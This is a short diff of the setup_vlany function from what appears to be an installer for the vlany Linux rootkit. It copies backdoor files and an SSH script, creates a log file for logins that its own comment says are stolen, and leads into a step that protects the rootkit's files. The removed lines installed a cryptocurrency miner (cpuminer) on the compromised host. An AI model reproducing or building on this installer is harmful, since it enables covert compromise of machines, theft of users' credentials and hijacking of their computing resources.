@@ -257,9 +257,6 @@ setup_vlany ()
     mv bd_readme $INSTALL/README
     cp misc/enter_lxc.c $INSTALL/enter_lxc.c
     cp misc/ssh.sh $INSTALL/ssh.sh
-    cp misc/cpuminer-master.zip $INSTALL/cpuminer-master.zip
-    mv minerd_setup.py $INSTALL/minerd_setup.py
-    chmod +x $INSTALL/minerd_setup.py
     touch $INSTALL/pam_auth_logs # gets rid of annoying "no such file or dir" output when no logins have been stolen yet
 
     # protect files and directories
